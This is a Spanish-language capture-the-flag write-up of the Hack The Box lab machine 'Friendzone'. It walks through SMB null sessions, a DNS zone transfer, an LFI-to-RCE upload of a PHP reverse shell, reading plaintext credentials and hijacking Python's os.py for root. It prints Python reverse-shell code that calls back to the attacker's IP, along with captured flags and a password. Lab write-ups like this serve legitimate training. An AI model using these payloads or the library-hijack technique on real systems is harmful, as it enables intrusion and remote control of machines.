---
title: Frienzone - Easy (HTB)
tags:
permalink: /Frienzone-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmap -sCV -p21,22,53,80,139,443,445 10.129.234.178                         
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-05 21:23 -0300
Nmap scan report for 10.129.234.178
Host is up (0.99s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Friend Zone Escape software
|_http-server-header: Apache/2.4.29 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-01-06T00:25:25
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2026-01-06T02:25:23+02:00
|_clock-skew: mean: -38m25s, deviation: 1h09m15s, median: 1m33s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.12 seconds
```

## Website

La pagina principal es estática, sin nada de contenido.

![image-center](/assets/images/Pasted image 20260105212455.png)
## SMB

Use un `Null Session` para conectarme al servicio de `smb` donde solo tuve acceso al recurso compartido `general`, dentro del mismo un archivo `txt` que me baje a mi maquina.

```BASH
impacket-smbclient friendzone.htb/@10.129.234.178 -no-pass -dc-ip 10.129.234.178                                   
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
print$
Files
general
Development
IPC$
# use general
ls
# ls
drw-rw-rw-          0  Wed Jan 16 17:10:51 2019 .
drw-rw-rw-          0  Tue Sep 13 11:56:24 2022 ..
-rw-rw-rw-         57  Tue Oct  9 20:52:42 2018 creds.txt
# get creds.txt
```

Además tambien tengo acceso a `Development`, que sin embargo no contiene nada de nada.

```
# use Development
ls
# ls
drw-rw-rw-          0  Wed Jan 16 17:03:49 2019 .
drw-rw-rw-          0  Tue Sep 13 11:56:24 2022 ..
# exit
```
### FTP fail

Usando las credenciales del `creds.txt` intente usarlas para la conexión `ftp` pero no son validas.

```bash
ftp admin@10.129.234.178
Connected to 10.129.234.178.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
```
### DNS Zone transfer

Enumerando el servicio `dns` veo que puedo hacer una transferencia de `zona` abusando del protocolo `AXFR`, y así pude obtener algunos subdominios.

```bash
dig axfr @10.129.234.178 friendzone.red

; <<>> DiG 9.20.15-2-Debian <<>> axfr @10.129.234.178 friendzone.red
; (1 server found)
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 1228 msec
;; SERVER: 10.129.234.178#53(10.129.234.178) (TCP)
;; WHEN: Mon Jan 05 21:32:03 -03 2026
;; XFR size: 8 records (messages 1, bytes 289)

```
## Shell as www-data
### Admin panel

En `administrator1.friendzone.red` hay un panel de admin.

![image-center](/assets/images/Pasted image 20260105215153.png)

En el mismo use las credenciales que obtuve antes y me salió el siguiente mensaje.
 
![image-center](/assets/images/Pasted image 20260105215216.png)
### LFI to RCE

Veo un mensaje el cual me indica que la pagina necesita del parámetro `iamge_id` y también de `pagename`.

![image-center](/assets/images/Pasted image 20260105215237.png)

Usando los del ejemplo me muestra lo siguiente.

![image-center](/assets/images/Pasted image 20260105215311.png)
### Webshell

Veo que abajo sale el mensaje de una pagina que se carga aparte, la cual también es accesible desde `http://<url>/timestamp.php`. Por lo que como tengo permisos de escritura en el recurso compartido `Development` puedo tratar de subir una webshell de este [repositorio](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

Me conecto y con `put` la subo al recurso.

```bash
impacket-smbclient friendzone.red/admin@friendzone.red -dc-ip 10.129.229.17
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
Type help for list of commands
# use development
# put rev.php
```
### Share path

Para poder hacer que la pagina ejecute el contenido de esta webshell, necesito la ruta donde se encuentra el mismo, como es un recurso compartido de `smb` los archivos de x `shares` se alojan en la ruta `/etc/<ShareName>`.

Así que tengo que colocar la ruta `/etc/Development/rev` para que el script se ejecute.

![image-center](/assets/images/Pasted image 20260105222401.png)

Y desde mi listener recibo la conexión como el usuario `www-data`.

```bash
nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.234.178] 52782
Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 03:24:52 up  1:02,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (810): Inappropriate ioctl for device
bash: no job control in this shell
www-data@FriendZone:/$ whoami
whoami
www-data

```

```bash
www-data@FriendZone:/home/friend$ cat user.txt 
5c4436a2f80df42c31004502b1d25ada
```
## Shell as friend

En la ruta `/var/www/` hay un archivo de configuración con las credenciales del usuario `friend`.

```bash
www-data@FriendZone:/var/www$ cat mysql_data.conf 
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
```
### Auth

Con las mismas me conecte a `ssh`.

```bash
ssh friend@friendzone.red                 
<SNIP>
friend@FriendZone:~$
```
## Shell as root

No vi nada de nada, asi que subi `pspy` para ver si hay procesos que se ejecutan cada `x` tiempo.

```bash
friend@FriendZone:/tmp$ wget 10.10.17.19/pspy
--2026-01-06 03:30:37--  http://10.10.17.19/pspy
Connecting to 10.10.17.19:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy’

pspy                                   100%[============================================================================>]   2.96M   328KB/s    in 13s     

2026-01-06 03:30:52 (231 KB/s) - ‘pspy’ saved [3104768/3104768]

friend@FriendZone:/tmp$ chmod +x pspy 
```
### Library hijacking

Luego de ejecutarlo veo que se ejecuta, un archivo en `python`.

```bash
2026/01/06 03:32:01 CMD: UID=0     PID=2286   | /usr/bin/python /opt/server_admin/reporter.py 
2026/01/06 03:32:01 CMD: UID=0     PID=2285   | /bin/sh -c /opt/server_admin/reporter.py 
```

En el contenido se ve que además de estar todo comentado, importa la librería `os`.

```python
friend@FriendZone:/tmp$ cat /opt/server_admin/reporter.py 
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```
### Reverse shell

Como es `python2.7` fui a la ruta `/usr/lib/python2.7` donde se ve el archivo `os.py`, donde yo tengo permisos de escritura.
Por lo que en el archivo coloque las siguientes líneas para recibir una shell contra mi equipo.

```python
r"""OS routines for NT or Posix depending on what system we're on.

This exports:
  - all functions from posix, nt, os2, or ce, e.g. unlink, stat, etc.
  - os.path is one of the modules posixpath, or ntpath
  - os.name is 'posix', 'nt', 'os2', 'ce' or 'riscos'
  - os.curdir is a string representing the current directory ('.' or ':')
  - os.pardir is a string representing the parent directory ('..' or '::')
  - os.sep is the (or a most common) pathname separator ('/' or ':' or '\\')
  - os.extsep is the extension separator ('.' or '/')
  - os.altsep is the alternate pathname separator (None or '/')
  - os.pathsep is the component separator used in $PATH etc
  - os.linesep is the line separator in text files ('\r' or '\n' or '\r\n')
  - os.defpath is the default search path for executables
  - os.devnull is the file path of the null device ('/dev/null', etc.)

Programs that import and use 'os' stand a better chance of being
portable between different platforms.  Of course, they must then
only use functions that are defined by all platforms (e.g., unlink
and opendir), and leave all pathname manipulation to os.path
(e.g., split and join).
"""

#'

import sys, errno
import pty
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.17.19",443))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
s.close()
_names = sys.builtin_module_names

```

```python
friend@FriendZone:/tmp$ cat os.py 
import socket
import subprocess

def system(command):
    # Tu código malicioso aquí
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.10.17.19", 4444))
    subprocess.call(["/bin/sh", "-i"], stdin=s, stdout=s, stderr=s)
```
### Shell

Por lo que después de unos segundos, debido a la ejecución del script que se hace como `root` recibí una shell.

```bash
 nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.234.180] 39586
root@FriendZone:~# whoami
whoami
root
```

```bash
root@FriendZone:~# cat /root/root.txt
cat /root/root.txt
6922123e69c21efc1ecd73db2e4b0945
```

`~Happy Hacking.`